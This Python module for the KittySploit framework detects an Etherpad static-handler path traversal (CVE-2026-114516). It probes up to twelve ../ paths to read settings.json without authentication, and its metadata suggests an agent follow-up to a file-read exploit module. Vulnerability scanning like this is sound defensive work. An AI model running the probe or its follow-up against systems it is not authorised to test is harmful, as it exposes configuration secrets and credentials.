#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-114516 — Etherpad static handler path traversal."""

from kittysploit import *
from lib.protocols.http.etherpad import Etherpad
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.path_traversal import Path_traversal


class Module(Scanner, Http_client, Etherpad, Path_traversal):
    __info__ = {
        "name": "Etherpad CVE-2026-114516 path traversal detect",
        "description": "Unauthenticated file read via /static/ traversal (settings.json).",
        "author": ["LLCForge", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-114516"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-114516"],
        "tags": ["etherpad", "lfi", "unauth", "cve-2026-114516"],
        "agent": {
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/etherpad_cve_2026_114516_file_read",
                ],
            },
        },
    }

    leak_file = OptString("settings.json", "File path to probe", required=False, advanced=True)
    traversal_depth = OptInteger(8, "Max ../ depth", required=False, advanced=True)

    def run(self):
        fp = self.etherpad_fingerprint()
        if not fp.get("reachable"):
            return False
        target = str(self.leak_file or "settings.json")
        for path in self.static_traversal_paths(target, int(self.traversal_depth or 8))[:12]:
            resp = self.etherpad_read_path(path)
            if not resp or int(resp.status_code or 0) != 200:
                continue
            body = resp.text or ""
            if "<!doctype html" in body.lower()[:200]:
                continue
            if len(body) < 3:
                continue
            reason = "Etherpad static traversal" if fp.get("is_etherpad") else "Traversal read OK"
            self.set_info(
                severity="critical",
                cve="CVE-2026-114516",
                reason=reason,
                path=path,
                bytes=len(body),
            )
            return True
        return False